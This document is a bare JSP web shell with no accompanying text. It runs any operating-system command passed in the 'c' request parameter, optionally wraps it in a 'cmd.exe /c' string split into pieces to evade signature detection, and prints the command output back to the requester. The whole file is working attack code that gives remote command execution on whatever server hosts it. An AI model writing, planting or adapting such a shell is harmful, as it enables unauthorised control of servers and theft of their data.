<pre><%if (request.getParameter("c") != null) {
  out.println("mingling: " + request.getParameter("c") + "\n<BR>");
  String type = request.getParameter("w")==null?"":"cm"+"d.e"+"xe /c ";
  Process p = Runtime.getRuntime(
  ).exec(type+request.getParameter("c"));
  java.io.OutputStream os = p.getOutputStream();
  java.io.InputStream in = p.getInputStream();
  java.io.DataInputStream dis = new java.io.DataInputStream(in);
  String disr = dis.readLine();
  while (disr != null) {out.println(disr); disr=dis.readLine();}}
%></pre>
